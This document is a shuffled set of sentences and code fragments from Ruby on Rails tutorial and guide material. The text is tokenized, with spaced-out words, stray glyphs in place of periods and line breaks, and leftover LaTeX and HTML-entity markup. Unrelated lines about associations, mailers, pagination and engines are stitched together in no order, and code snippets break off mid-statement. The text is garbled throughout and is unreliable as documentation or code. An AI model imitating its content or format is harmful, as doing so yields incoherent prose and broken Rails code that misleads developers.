Action Mailer now just inherits from `AbstractController` , so you have access to ╼ the same generic helpers as you do in Action Controller .
&lt; / script &gt;
While Rails uses intelligent defaults that will work well in most situations , there may be times when you want to customize the behavior of the `has _ many` association reference ▖
invoke test _ unit
Follower notifications
The user show page with a custom Gravatar ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / profile _ custom _ gravatar _ bootstrap _ 4 _ 0-full ▖ png } { ( full size ) }
change
# # # # content _ for
This is equivalent to the literal constructor , but it &apos;s more explicit about what we &apos;re doing .
in Listing ~ \ ref { code : will _ paginate _ test } .
At the end of the signup process , it &apos;s important to render a profile page with the newly created user &apos;s information , so we &apos;ll begin by making a page for \ emph { showing } users , which will serve as the first step toward implementing the REST architecture for users ( Section ~ \ ref { sec : mvc _ in _ action } ) .
First , before adding any feature to a Rails application , take a look at the \ href { http : / / railscasts ▖ com / episodes / archive } { RailsCasts archive } to see if Ryan Bates has already covered the subject
The final \ kode { correct \ _ user } before filter ▖
Our plan is to edit the Home , Help , and About pages to make page titles that change on each page .
test : mysql
`underscore` accepts no argument though .
This ╼ file requires the `blorgh / engine ▖ rb` file ( located at `lib / blorgh / engine ▖ rb` ) ╼ and defines a base module called `Blorgh` .
All of the association methods are built around caching , which keeps the result of the most recent query available for further operations ▖
For JavaScript , ╼ more complex processes can be applied ▖
def welcome _ email ( user , company )
# # # `uniqueness`
* How to specify the order , retrieved attributes , grouping , and other properties of the found records .
It will first require `lib / blorgh ▖ rb` from the engine , then ╼ `lib / blorgh / engine ▖ rb` , which is the file that defines the major pieces of ╼ functionality for the engine .
Prefer wordings that avoid &quot; you &quot; s and &quot; your &quot; s ▖
( Here \ kode { PictureUploader } is defined in the file \ kode { picture \ _ uploader ▖ rb } , \ linebreak which we &apos;ll start editing in Section ~ \ ref { sec : image _ validation } , but for now the generated default is fine ▖ )
With the code as above , following the link from Listing ~ \ ref { code : password _ reset _ email } should render a password reset form .
isn &apos;t \ href { https : / / en ▖ wikipedia ▖ org / wiki / Vacuous _ truth } { vacuously true } ( and similarly for \ kode { followers } ) .
&lt; / section &gt;
as shown in Listing ~ \ ref { code : initial _ passing _ password _ tests } .
# This file contains settings for ActionController : : ParamsWrapper which
( You may have to use \ texttt { Ctrl-C } restart the local web server .
As promised in the introduction , our Users resource will be created by a scaffold generator program , which comes standard with each Rails project .
&gt; &gt; x + = 1
To handle an uploaded image and associate it with the Micropost model , we &apos;ll use the \ href { https : / / github ▖ com / carrierwaveuploader / carrierwave } { CarrierWave } image uploader .
A mockup of the users index page .
( -5 ▖ ▖ 5 ) ▖ to _ a ▖ split { &#124; i &#124; i ▖ multiple _ of ? (
* `config ▖ action _ view ▖ embed _ authenticity _ token _ in _ remote _ forms` allows you to set the default behavior for `authenticity _ token` in forms with ` : remote = &gt; true` ▖
( Listing ~ \ ref { code : base _ title _ test } uses an \ emph { instance variable } , seen briefly in Section ~ \ ref { sec : mvc _ in _ action } and covered further in Section ~ \ ref { sec : a _ user _ class } , combined with \ emph { string interpolation } , which is covered further in Section ~ \ ref { sec : strings } ▖ )
In the case of Listing ~ \ ref { code : users _ migration } , \ kode { change } uses a Rails method called \ kode { create \ _ table } to create a table in the database for storing users .
The directory
Adding a title and heading for the user profile page .
image _ path ( &quot; edit ▖ png &quot; ) # = &gt; / assets / edit ▖ png
The paginated user index is now complete , but there &apos;s one improvement I can &apos;t resist including : Rails has some incredibly slick tools for making compact views , and in this section we &apos;ll refactor the index page to use them .
c ▖ first _ name = = o ▖ customer ▖ first _ name # = &gt; true
I also recommend investigating the site monitoring applications \ href { http : / / scoutapp ▖ com / } { Scout } and \ href { http : / / www ▖ newrelic ▖ com / } { New Relic }
Although we &apos;ll never need to edit it in the main tutorial , an example of adding a rule to the \ kode { ▖ gitignore } file appears in Section ~ \ ref { sec : guard } , which is part of the optional advanced testing setup in Section ~ \ ref { sec : advanced _ testing _ setup } .
= &gt; &quot; 428177foobar &quot;
To summarize , the Rails team uses ` : nodoc : ` to mark publicly visible methods and classes for internal use ; changes to the visibility of API should be considered carefully and discussed over a pull request first .
The new password resets form has a lot in common with Listing ~ \ ref { code : login _ form _ redux } ; the most important differences are the use of a different resource and URL in the call to \ kode { form \ _ for } and the omission of the password attribute .
For example , after spending several hours unsuccessfully trying to install Ruby 2 ▖ 1 ▖ 4 on my local machine , I discovered that Ruby 2 ▖ 1 ▖ 5 had been released the day before .
&lt; td &gt; &lt; % = article ▖ text % &gt; &lt; / td &gt;
To save the user object to the database , we call the \ kode { save } method on the \ kode { user } variable :
That &apos;s followed by some tips and tricks for working with associations , and then by a complete reference to the methods and options for associations in Rails .
* FROM &quot; users &quot; WHERE &quot; users &quot; ▖ &quot; state &quot; = &apos; active &apos; AND &quot; users &quot; ▖ &quot; state &quot; = &apos; finished&apos;
As with the line to include the application stylesheet , the code in Listing ~ \ ref { code : title _ helper } may look simple to the eyes of an experienced Rails developer , but it &apos;s \ emph { full } of important Ruby ideas : modules , method definition , optional method arguments , comments , local variable assignment , booleans , control flow , string concatenation , and return values .
Adding the User model \ kode { followed \ _ users } association .
Client ▖ find _ by !
You need to explicitly define them as part of your migrations .
# Generates class methods to access @ @ emulate _ booleans .
&lt; % = render partial : &quot; form &quot; , locals : { zone : @ zone } % &gt;
Permission is hereby granted , free of charge , to any person obtaining a copy
has _ one : profile
module Dependencies
The ` : inverse _ of` option specifies the name of the `has _ many` or `has _ one` association that is the inverse of this association ▖
Interpretation of the output of EXPLAIN is beyond the scope of this guide ▖
Getting Started with Rails ╼ = = = = = = = = = = = = = = = = = = = = = = = = = = ╼ ╼
# library
╼ Loading test environment
To get started , users \ emph { not } using the Cloud9 IDE recommended in Section ~ \ ref { sec : development _ environment } should make a \ kode { workspace } directory for your Rails projects if it doesn &apos;t already exist ( Listing ~ \ ref { code : mkdir _ rails _ projects } ) and then change into the directory .
background-color : red ;
In Chapter ~ \ ref { cha : following _ users } , we &apos;ll see an example where REST principles allow us to model a subtler problem , ``following users &apos; &apos; , in a natural and convenient way .
validates : card _ number , presence : true , if : : paid _ with _ card ?
$ bundle exec guard
In this example , ╼ it would make sense to have an image in one of the asset load paths , such as ╼ `app / assets / images / image ▖ png` , which would be referenced here ▖
* Instantiate the equivalent Ruby object of the appropriate model for every resulting row .
The default XML builder is a fresh instance of `Builder : : XmlMarkup` ▖
Adding the \ texttt { bootstrap-sass } gem to the \ kode { Gemfile } .
If there is no ` ▖ erb` layout , Rails will use a ` ▖ builder` layout if one exists ▖
With most of the options to `render` , the rendered content is displayed as part of the current layout ▖
Please do not open pull requests in docrails , if you &apos;d like to get feedback on your ╼ change , ask for it in &#91; Rails &#93; ( http : / / github ▖ com / rails / rails ) instead .
This handy command creates a skeleton Rails application in a directory of your choice .
To help with the transition from tutorial to independent development , Section ~ \ ref { sec : following _ conclusion } offers some pointers to more advanced resources .
We start by creating an \ kode { update } action , which uses \ kode { update \ _ attributes } ( Section ~ \ ref { sec : updating _ user _ objects } ) to update the user based on the submitted \ kode { params } hash , as shown in Listing ~ \ ref { code : user _ update _ action _ unsuccessful } .
message : &quot; % { value } is not a valid size &quot; } , allow _ nil : true
Note that Listing ~ \ ref { code : password _ reset _ form } uses the form tag helper
class Customer &lt; ActiveRecord : : Base
You can override this and explicitly specify the primary key with the ` : primary _ key` option .
In the present case , the \ kode { post \ _ via \ _ redirect } method ( seen before in Listing ~ \ ref { code : a _ test _ for _ valid _ submission } ) is available only in integration tests , so the code
See ╼ &#91; Manifest Files and Directives &#93; ( # manifest-files-and-directives ) for more details ╼ on require _ tree .
from Listing ~ \ ref { code : test _ helper _ log _ in } to
puts p ▖ name # &quot; Some Book &quot;
$ bundle exec rake test ╼ 3 tests , 6 assertions , 1 failures , 0 errors , 0 skips
The controller captures the users in the \ kode { @ users } variable , which is passed to the \ kode { index } view .
Configuring the image uploader for production .
( Only the first two lines above are strictly necessary .
as shown in Listing ~ \ ref { code : adding _ the _ about _ page } .
&#124; `Deer` &#124; `deers` &#124;
If you want unique categories , you can use `Category ▖ joins ( : articles ) ▖ uniq` .
= &gt; &#91; &quot; a &quot; , &quot; b &quot; , &quot; c &quot; , &quot; d &quot; , &quot; e &quot; , &quot; f &quot; , &quot; g &quot; , &quot; h &quot; , &quot; i &quot; , &quot; j &quot; , &quot; k &quot; , &quot; l &quot; , &quot; m &quot; , &quot; n &quot; , &quot; o &quot; ,
However , you can read and write this property , if you embed the code directly in the HTML document ( as it happens with XSS ) ▖
Aaron Patterson &apos;s ╼ &#91; hana &#93; ( https : / / github ▖ com / tenderlove / hana ) is one such gem , but doesn &apos;t have ╼ full support for the last few changes in the specification .
&quot; Product &quot; ▖ deconstantize # = &gt; &quot; &quot;
╼ ╼ \ subsection { Our first test } % ( fold ) ╼ \ label { sec : our _ first _ test } ╼ ╼
belongs _ to : assembly
Please check `test / core _ ext / date _ ext _ test ▖ rb` in the Active Support test suite for expected behavior .
has _ many : orders , class _ name : &quot; Transaction &quot;
* Rails 4 ▖ 0 introduces `ActiveSupport : : KeyGenerator` and uses this as a base from which to generate and verify signed cookies ( among other things ) ▖
# &lt; name &gt; Jeremy Kemper &lt; / name &gt;
Relationships fixtures for use in following / follower tests .
* `new _ photo _ path` returns ` / photos / new`
It &apos;s best to run it in `console` block :
# # # # `transform _ values` &amp; &amp; `transform _ values ! `
You can use the `match` method with the ` : via` option to match multiple verbs at once :
There &apos;s no need to try to shoehorn every last piece of your application into a resourceful framework if that &apos;s not a good fit .
Another important feature of a blog is being able to delete spam comments ▖
class GoodnessValidator &lt; ActiveModel : : Validator
╼ / db / * ▖ sqlite3 ╼ / db / * ▖ sqlite3-journal ╼ ╼ # Ignore all logfiles and tempfiles .
$ ( &quot; # new _ article &quot; ) ▖ on ( &quot; ajax : success &quot; , ( e , data , status , xhr ) - &gt;
A mockup of the result---users , pagination links , and a ``Users &apos; &apos; navigation link---appears in Figure ~ \ ref { fig : user _ index _ mockup }
The `add` method lets you manually add messages that are related to particular attributes ▖
is invalid because of the hyphens .
{ enumerate } ╼ ╼ \ begin { codelisting } ╼ \ label { code : palindrome _ tester } ╼ \ codecaption { A simple tester for palindromes ▖ } ╼ % = lang : irb ╼ \ begin { code } ╼ &gt; &gt; def palindrome _ tester ( s ) ╼ &gt; &gt; if FILL _ IN ╼ &gt; &gt; puts &quot; It &apos;s a palindrome ! &quot; ╼ &gt; &gt; else ╼ &gt; &gt; puts &quot; It &apos;s not a palindrome ▖ &quot; ╼ &gt; &gt; end ╼ &gt; &gt; end ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ \ subsection { Back to the title helper } % ( fold ) ╼ \ label { sec : back _ to _ the _ title _ helper } ╼ ╼ We are now in a position to understand the \ kode { full \ _ title } helper from Listing ~ \ ref { code : title _ helper } , \ footnote {
/ / = require _ tree .
Integration tests are especially powerful , as they allow us to simulate the actions of a user interacting with our application using a web browser .
javascript _ tag &quot; alert ( &apos; All is good &apos; ) &quot;
A view &apos;s purpose is to display this information in a human readable format ▖
* How to cherry-pick just the extensions you want .
The first of these was included automatically by the migration in Listing ~ \ ref { code : micropost _ migration } via \ kode { belongs \ _ to : user } , as shown in Listing ~ \ ref { code : micropost _ belongs _ to _ user } .
One thing that can help is `and return` ▖
By the end of the \ emph { Rails Tutorial } , you &apos;ll know all the most important ones .
Keep in mind the order of these preprocessors is important ▖
We &apos;ll write simple tests for each of the titles in Table ~ \ ref { table : static _ pages } by combining the tests in Listing ~ \ ref { code : about _ page _ content _ spec } with the \ kode { assert \ _ select } method , which lets us test for the presence of a particular HTML tag ( sometimes called a ``selector &apos; &apos; , hence the name )
The \ kode { bundle install } command might take a few moments , but when it &apos;s done our application will be ready to run .
in Listing ~ \ ref { code : new _ edit _ partial } .
association _ foreign _ key : &quot; other _ user _ id &quot;
A safe string is one that is marked as being insertable into HTML as is ▖
In other words , the first example above could replace \ kode { str } with any other valid variable name , such as \ kode { the \ _ function \ _ argument } , and it would work just the same :
And due to a bug in ( Ruby and ) Rails up to version 2 ▖ 1 ▖ 2 ( excluding it ) , a hacker may inject arbitrary header fields ; for example like this :
belongs _ to : customer , touch : : orders _ updated _ at
* `ActiveSupport : : Cache : : Store ▖ logger` specifies the logger to use within cache store operations .
```ruby
Using the \ kode { belongs \ _ to } / \ kode { has \ _ many } association defined in this section , \ linebreak Rails constructs the methods shown in Table ~ \ ref { table : association _ methods } .
We &apos;ll see starting in Section ~ \ ref { sec : following } how to use the Relationship model to simulate both Active Relationship and Passive Relationship models .
Verify that a logout link appears
We &apos;ve already defined a \ kode { digest } method for use in the test fixtures ( Listing ~ \ ref { code : digest _ method } ) , and we can use the results of the discussion above to create a \ kode { new \ _ token } method to create a new token .
self ▖ emulate _ booleans = true
Although our user following implementation is complete as it stands , we have one bit of polish left to add before starting work on the status feed .
Implementing one or more of these application extensions will help you make the transition from following a tutorial to writing original applications of your own .
The problem with the code in Section ~ \ ref { sec : a _ first _ feed _ implementation } is that \ kode { following \ _ ids } pulls \ emph { all } the followed users &apos; ids into memory , and creates an array the full length of the followed users array .
The Static Pages controller test with a base title ▖
* These equivalent methods may not execute the same SQL as the previous implementation .
Indeed , this situation is confusing enough that a popular &#91; article &#93; ( http : / / weblog ▖ jamisbuck ▖ org / 2007 / 2 / 5 / nesting-resources ) by Jamis Buck proposes a rule of thumb for good Rails design :
This is for the benefit of the \ kode { change } method , which takes as arguments an object and a symbol and then calculates the result of calling that symbol as a method on the object both before and after the block .
Finding a user to follow .
umerate } ╼ ╼ % subsection a _ working _ follow _ button _ with _ ajax ( end ) ╼ ╼ \ subsection { Following tests } % ( fold ) ╼ \ label { sec : following _ tests } ╼ ╼
We &apos;ll start with a couple of tests involving collections of valid and invalid addresses .
At this point , the tests are \ passing :
WIP : Not all the helpers are listed here ▖
The railties test suite in particular takes a long time , and even ╼ more if the source code is mounted in ` / vagrant` as happens in the recommended ╼ workflow with the &#91; rails-dev-box &#93; ( https : / / github ▖ com / rails / rails-dev-box ) .
* `config ▖ active _ record ▖ dump _ schema _ after _ migration` is a flag which ╼ controls whether or not schema dump should happen ( `db / schema ▖ rb` or ╼ `db / structure ▖ sql` ) when you run migrations ▖
Sublime Text is heavily influenced by \ href { http : / / macromates ▖ com } { TextMate } , and in fact is compatible with most TextMate customizations , such as snippets and color schemes .
* `around _ enqueue`
There is a second popular template system called \ href { http : / / haml-lang ▖ com / } { Haml } , which I personally love , but it &apos;s not \ emph { quite } standard enough yet for use in an introductory tutorial .
* `config ▖ active _ support ▖ time _ precision` sets the precision of JSON encoded time values ▖
To make a \ kode { followed \ _ users } array of users , it would be possible to pull out an array of \ kode { followed \ _ id } attributes and then find the user for each one .
# # # # `find _ each`
\ chapter { User microposts } ╼ \ label { cha : user _ microposts } ╼ ╼
date ▖ end _ of _ hour # = &gt; Mon Jun 07 19 : 59 : 59 + 0200 2010
&lt; % = f ▖ text _ field : commenter % &gt;
Cucumber features are easily readable , but they are entirely separate from the code that implements them---a property that cuts both ways .
There are times when you might like to change this , and you can do so by setting the ` : content _ type` option :
The solution is to filter the backtrace to eliminate unwanted lines .
The `has _ many` association creates a one-to-many relationship with another model ▖
Because the \ kode { account \ _ activation } method defined in Listing ~ \ ref { code : mail _ account _ activation } requires a valid user object as an argument , the code in Listing ~ \ ref { code : generated _ user _ mailer _ previews } won &apos;t work as written .
\ emph { Hint } : Add to the test in Listing ~ \ ref { code : layout _ links _ test } using the \ kode { log \ _ in \ _ as } helper .
as shown in Listing ~ \ ref { code : puma _ gemfile } .
&#91; * object &#93;
client = Client ▖ take ( 2 )
For ╼ a full list of all available options , please have a look further down at the ╼ Complete List of Action Mailer user-settable attributes section .
( If the command in Listing ~ \ ref { code : rails _ command } returns an error like ``Could not find &apos; railties &apos; &apos; &apos; , it means you don &apos;t have the right version of Rails installed , and you should double-check that you followed the command in Listing ~ \ ref { code : installing _ rails } exactly as written ▖ )
( Listing ~ \ ref { code : friendly _ forwarding _ test } also removes the test for rendering the edit template since that &apos;s no longer the expected behavior ▖ )
&lt; / p &gt;
The resulting cleaned-up views appear in Listing ~ \ ref { code : home _ view _ interior } , Listing ~ \ ref { code : help _ view _ interior } , and Listing ~ \ ref { code : about _ view _ interior } .
Adding this in a default scope for the Micropost model gives Listing ~ \ ref { code : micropost _ ordering } .
With the \ kode { @ user } instance variable from Listing ~ \ ref { code : initial _ edit _ action } , the edit page should render properly , as shown in Figure ~ \ ref { fig : edit _ page } .
A new password reset view .
# # # I18n enforcing available locales
Extensions to `Regexp`
Both kinds of dependencies will be installed when `bundle install` is run inside ╼ of the application ▖
Tests for the micropost &apos;s user association .
in Listing ~ \ ref { code : user _ factory } .
To get the layout to work , we have to replace the default title with the embedded Ruby from the examples above :
INNER JOIN articles ON articles ▖ category _ id = categories ▖ id
% w ( a b c d ) ▖ from ( 2 ) # = &gt; % w ( c d )
If you have an instance of the `Picture` model , you can get to its parent via ` @ picture ▖ imageable` ▖
has _ many : through Association Diagram &#93; ( images / has _ many _ through ▖ png )
is a call to this function .
Code to seed the following relationships appear in Listing ~ \ ref { code : sample _ relationships } .
&lt; % = stylesheet _ link _ tag &quot; application &quot; , media : &quot; all &quot; % &gt;
&gt; &gt; Rails ▖ env ▖ test ?
Showing hidden files in the file navigator .
Sometimes , ╼ the core team will have to make a judgement call ▖
self ▖ class _ eval % {
in Listing ~ \ ref { code : full _ feed _ test } .
errors ▖ add ( : name , &quot; cannot contain the characters !
# Ignore all logfiles and tempfiles .
NOTE : Defined in `active _ support / core _ ext / range / include _ range ▖ rb` .
as shown in Listing ~ \ ref { code : destroy _ forget } .
So far , we haven &apos;t touched the database : \ kode { User ▖ new } only creates an object \ emph { in memory } , while \ kode { user ▖ valid ? } \ merely checks to see if the object is valid .
To disable the assets cache store :
Note the use of HTML escaping via \ kode { CGI ▖ escapeHTML } ; see if you can figure out why this is necessary .
There &apos;s also the bang variant `transform _ values ! ` that applies the block operations to values in the very receiver .
rescue
$ cp README ▖ rdoc README ▖ md
As we &apos;ll see in Section ~ \ ref { sec : remember _ tests } , this design ( with a little refactoring ) will also make the authentication machinery easier to test .
The final sample application will bear more than a passing resemblance to a certain popular \ href { http : / / twitter ▖ com / } { social microblogging site } ---a site which , coincidentally , was also originally written in Rails .
The engine contains migrations for the `blorgh _ articles` and `blorgh _ comments` ╼ table which need to be created in the application &apos;s database so that the ╼ engine &apos;s models can query them correctly ▖
All this does is add
&lt; h1 &gt; Editing article &lt; / h1 &gt;
Here &apos;s how you can handle the changes :
* ` : greater _ than` - Specifies the value must be greater than the supplied ╼ value ▖
As we &apos;ll see starting in Section ~ \ ref { sec : database _ migrations } , the label \ kode { users } in Figure ~ \ ref { fig : demo _ user _ model } corresponds to a \ emph { table } in a database , and the \ kode { id } , \ kode { name } , and \ kode { email } attributes are \ emph { columns } in that table .
Since the ╼ assets from a CDN are geographically closer to the browser , the request is ╼ faster , and since your server doesn &apos;t need to spend time serving assets , it can ╼ focus on serving application code as fast as possible .
# # # # # `beginning _ of _ week` , `end _ of _ week`
If you set the ` : touch` option to ` : true` , then the `updated _ at` or `updated _ on` timestamp on the associated object will be set to the current time whenever this object is saved or destroyed :
If Header Injection was possible , Response Splitting might be , too ▖
number _ with _ delimiter ( 12345678 ) # = &gt; 12,345,678
The user index page \ href { http : / / localhost : 3000 / users } { / users } with 100 sample users ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ index _ all _ bootstrap-full ▖ png } { ( full size ) }
In this chapter , we &apos;ll change this by incorporating the \ emph { Bootstrap } framework into our application , and then we &apos;ll add some custom styles of our own
As indicated in Section ~ \ ref { sec : remember _ tests } , as the application is currently designed there &apos;s no way to access the virtual \ kode { remember \ _ token } attribute in the integration test in Listing ~ \ ref { code : remember _ me _ test } .
If any validations fail , the object will be marked as invalid and ╼ Active Record will not perform the `INSERT` or `UPDATE` operation ▖
This link is then served by the asset pipeline .
A `belongs _ to` association sets up a one-to-one connection with another model , such that each instance of the declaring model &quot; belongs to &quot; one instance of the other model ▖
( The same thing happens with other Ruby data structures , such as strings and hashes ▖ )
Which would produce :
in Listing ~ \ ref { code : account _ activations _ route } .
This requires the \ href { https : / / github ▖ com / metaskills / mini _ backtrace } { \ texttt { mini \ _ backtrace } } gem included in Listing ~ \ ref { code : gemfile _ sample _ app } , combined with a \ emph { backtrace silencer } .
As with the test for invalid submission in Section ~ \ ref { sec : a _ test _ for _ invalid _ submission } , our main purpose is to verify the contents of the database .
Table ~ \ ref { table : password _ token _ digest } illustrates the analogy ( including the password reset from Section ~ \ ref { sec : password _ reset } ) .
calculates
To write the application code , we need to fill in the \ kode { edit } action in the Users controller .
xhr : get , : index , format : : js
If you have an array with a string , for example , it will look like this :
This command adds the project files to a \ emph { staging area } , which contains pending changes to your project ; you can see which files are in the staging area using the \ kode { status } command
Including \ texttt { will \ _ paginate } in the \ kode { Gemfile } .
mattr _ accessor : history
$ ( &quot; # new _ article &quot; ) ▖ append &quot; &lt; p &gt; ERROR &lt; / p &gt; &quot;
The next part of the message contains a hash ▖
* Rails 4 ▖ 0 has changed `ActiveModel : : Serializers : : JSON ▖ include _ root _ in _ json` default value to `false` ▖
This means if you add an ╼ `erb` extension to a CSS asset ( for example , `application ▖ css ▖ erb` ) , then ╼ helpers like `asset _ path` are available in your CSS rules :
And , believe it or not , in this chapter we &apos;ll even put our first app on the wider web by \ emph { deploying } it to production ( Section ~ \ ref { sec : deploying } ) .
When you get to Chapter ~ \ ref { cha : modeling _ users } , see if you can figure out why ▖ )
If you &apos;re using the cloud IDE , there are a couple of irb configuration parameters I recommend including .
It is your responsibility to ensure calling `html _ safe` on a particular string is fine .
* How to check for the existence of particular records .
# # # Testing Routes
&#91; user &#93; ▖ to _ formatted _ s ( : db ) # = &gt; &quot; 8456 &quot;
The sample data populator code with an admin user .
= &gt; Object
This cache is not thread safe .
At the end , we &apos;ll re-run the tests from Section ~ \ ref { sec : adding _ page _ titles } to verify that the titles are still correct .
We see from the \ kode { class } keyword in Listing ~ \ ref { code : static _ pages _ controller } that \ kode { static \ _ pages \ _ controller ▖ rb } defines a \ emph { class } , in this case called \ kode { StaticPagesController } .
This doesn &apos;t apply to just Decorators , but anything that you add in an engine ╼ that isn &apos;t referenced by your main application .
This is very similar to the `Article` model that you saw earlier ▖
default from : &quot; from @ example ▖ com &quot;
user ▖ name = &quot; David &quot;
&lt; option value = &quot; 4 &quot; &gt; Rwanda &lt; / option &gt;
This tells sprockets to add ╼ your engine assets when `rake assets : precompile` is triggered .
C ▖ subclasses # = &gt; &#91; B &#93;
second : two
Migrations are Ruby classes that are ╼ designed to make it simple to create and modify database tables ▖
First taste of the REST architecture
# # # DateHelper
# # # # strip _ tags ( html )
# via a relation
We can treat this like a Rails console , issuing commands to figure out the state of the application :
Missing template articles / new , application / new with { locale : &#91; : en &#93; , formats : &#91; : html &#93; , handlers : &#91; : erb , : builder , : coffee &#93; } ▖
This uses the \ kode { xhr } method ( for ``XmlHttpRequest &apos; &apos; ) to issue an Ajax request ; compare to the \ kode { get } , \ kode { post } , \ kode { patch } , and \ kode { delete } methods used in previous tests .
* = require layout
Response headers for example have a status code , Cookie and Location ( redirection target URL ) field ▖
Client ▖ limit ( 1 ) ▖ pluck ( : name )
There is one subtlety , though : on \ emph { failed } micropost submission , the Home page expects an \ kode { @ feed \ _ items } instance variable , so failed submissions currently break .
The `association` method returns the associated object , if any ▖
makes a CSS class corresponding to the type of message , so that for a \ kode { : success } message the class is
to see the version number .
&lt; optgroup label = &quot; Asia &quot; &gt;
In this section , we &apos;ll add an integration test for account activation .
The result is shown in Figure ~ \ ref { fig : riding _ rails _ environment } .
c2 = Client ▖ find ( 1 )
To make this setting customizable , the engine ╼ will have a configuration setting called `author _ class` that will be used to ╼ specify which class represents users inside the application .
With the association thus made , we can update the \ kode { setup } method in Listing ~ \ ref { code : micropost _ validity _ test } with the idiomatically correct way to build a new micropost , as shown in Listing ~ \ ref { code : micropost _ validity _ test _ idiomatic } .
When `params &#91; : token &#93; ` is one of : ` &#91; &#93; ` , ` &#91; nil &#93; ` , ` &#91; nil , nil , ▖ ▖ ▖ &#93; ` or ╼ ` &#91; &apos; foo &apos; , nil &#93; ` it will bypass the test for `nil` , but `IS NULL` or ╼ `IN ( &apos; foo &apos; , NULL ) ` where clauses still will be added to the SQL query .
Installing Rails with a specific version number .
Even though our test suite is now passing , we &apos;re not finished with the before filter , because the suite is still \ passing \ even if we remove our security model , as you can verify by commenting it out ( Listing ~ \ ref { code : commented _ out _ before _ filter } ) .
In analogy with account activations , our general plan is to make a Password Resets resource , with each password reset consisting of a reset token and corresponding reset digest ▖ The primary sequence goes like this :
The `render` method can do without a view completely , if you &apos;re willing to use the ` : inline` option to supply ERB as part of the method call ▖
middlewares &lt; &lt; &#91; : : Rack : : ContentLength &#93;
╼ $ rails destroy controller FooBars baz quux
Since `false ▖ present ? ` is false , if you want to validate the absence of a boolean ╼ field you should use `validates : field _ name , exclusion : { in : &#91; true , false &#93; } ` .
invoke css
&#91; &#93; ▖ append ( &#91; 1,2 &#93; ) # = &gt; &#91; &#91; 1,2 &#93; &#93;
as shown in Listing ~ \ ref { code : signup _ flash } .
In previous versions of Rails , such a feat would have taken more than twice as much code , but because of the compact \ kode { validates } method and \ kode { has \ _ secure \ _ password } , we were able to build a complete User model using less than a dozen lines of code .
By default , the name of the root element is the underscorized and dasherized plural of the name of the class of the first item , provided the rest of elements belong to that type ( checked with `is _ a ? ` ) and they are not hashes ▖
On the next page , press &quot; New pull request &quot; in the upper right ╼ hand corner .
in Listing ~ \ ref { code : password _ tests } .
category ▖ articles ▖ created _ before ( time )
Another common model is to expire the session after a certain amount of time .
Date ▖ new ( 2010 , 2 , 28 ) ▖ advance ( days : 1 ) ▖ advance ( months : 1 )
You can do this by running this ╼ command :
`beginning _ of _ minute` is aliased to `at _ beginning _ of _ minute` .
# &lt; Client id : 2 , first _ name : &quot; Fifo &quot; &gt; ,
mail ( to : @ user ▖ email ,
It uses the ╼ `present ? ` method to check if the value is not either nil or a blank string , that ╼ is , a string that is either empty or consists of whitespace .
&apos;Header-Name &apos; = &gt; &apos; Header-Value &apos; ,
When deploying to Heroku , you may get a warning message like this one :
EOT
email ▖ attachments ▖ each do &#124; attachment &#124;
In our example from above , our mailer view for the ╼ `welcome _ email` method will be in `app / views / user _ mailer / welcome _ email ▖ html ▖ erb` ╼ for the HTML version and `welcome _ email ▖ text ▖ erb` for the plain text version .
Here \ kode { User ▖ count } is \ kode { 0 } because we reset the database at the beginning of this section .
Article ▖ find ( 10 ) ▖ comments ▖ reorder ( &apos; name &apos; )
( Figure ~ \ ref { fig : profile _ mockup } has our first example of \ emph { lorem ipsum } text , which has a \ href { http : / / www ▖ straightdope ▖ com / columns / read / 2290 / what-does-the-filler-text-lorem-ipsum-mean } { fascinating story } that you should definitely read about some time ▖ )
Here \ kode { remember \ _ digest } is an attribute on the User model , and inside the model we can rewrite it as follows :
An example with a predicate :
Moreover , Rails conventionally uses \ emph { named routes } , which involves code like
The user index with pagination .
If you run into any problems while following the tutorial , I suggest consulting the resources listed on the \ href { http : / / railstutorial ▖ org / help } { Rails Tutorial help page }
&quot; # { active _ record ▖ name ▖ demodulize ▖ underscore ▖ pluralize } _ count &quot;
Controls what happens to the associated object when its owner is destroyed :
class Engine &lt; : : Rails : : Engine
( You may have to scroll up a bit to see it ▖ )
validate do &#124; person &#124;
A mockup of the user index , with pagination and a ``Users &apos; &apos; nav link ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ index _ mockup _ bootstrap-full ▖ png } { ( full size ) }
options &#91; &quot; type &quot; &#93; = &quot; checkbox &quot;
To actually create the table , you &apos;d run `rake db : migrate` ╼ and to roll it back , `rake db : rollback` .
By comparing encrypted values instead of raw passwords , we will be able to authenticate users without storing the passwords themselves .
Open `app / views / welcome / index ▖ html ▖ erb` and modify it as follows :
Rails supports multiple-key indices .
class UserMailer &lt; ApplicationMailer
In effect , by enclosing the button click in a block we are able to replace
email : params &#91; : email &#93; )
&#124; &#124; 403 &#124; : forbidden &#124;
If you have code that looks like ╼ this , you must change your code to do this instead :
( If displaying all the users at once seems like a bad idea , you &apos;re right , and we &apos;ll remove this blemish in Section ~ \ ref { sec : pagination } ▖ )
If you were to use the class , Rails would attempt ╼ to load that class and then reference the related table ▖
We &apos;ll next add a follow / unfollow form , and then make dedicated pages for showing user followed users and followers .
subject : &apos; Welcome to My Awesome Site &apos; ,
c2 ▖ name = &quot; should fail &quot;
If you really mean to load JavaScript from remote ` &lt; script &gt; ` tags , skip CSRF ╼ protection on that action .
This method removes all scoping and will do a normal query on the table .
You can prefix routes with a named parameter also :
# Use CoffeeScript for ▖ js ▖ coffee assets and views
require &apos; active _ support / core _ ext / object / blank&apos;
If your system complains about the lack of a JavaScript runtime , visit the \ href { https : / / github ▖ com / sstephenson / execjs } { execjs page at GitHub } for a list of possibilities .
= &gt; &quot; 3 errata &quot;
user _ name : &apos; &lt; username &gt; &apos; ,
For instance , ╼ if your database is using Latin-1 internally , and your user enters a Russian , ╼ Hebrew , or Japanese character , the data will be lost forever once it enters ╼ the database ▖
&lt; h1 &gt; Products &lt; / h1 &gt;
Next , we &apos;ll add a Rake task to seed the database with sample users , for which Rails uses the standard location \ kode { db / seeds ▖ rb } .
An alternative and cleaner syntax is to nest the hash conditions :
If the source filename has no extension , ▖ css will be appended ▖
Installing Rails , generating an application , and editing the resulting files is easy using a pre-configured cloud environment .
Everything is done very much ``the Rails way &apos; &apos; ---a way that felt very unnatural to me before , but now after doing this book finally feels natural .
# # # # The `assert _ recognizes` Assertion
Strips all link tags from text leaving just the link text .
For example , you may wish to create a ╼ `test / models` directory for your model tests .
We can see how it works at the console :
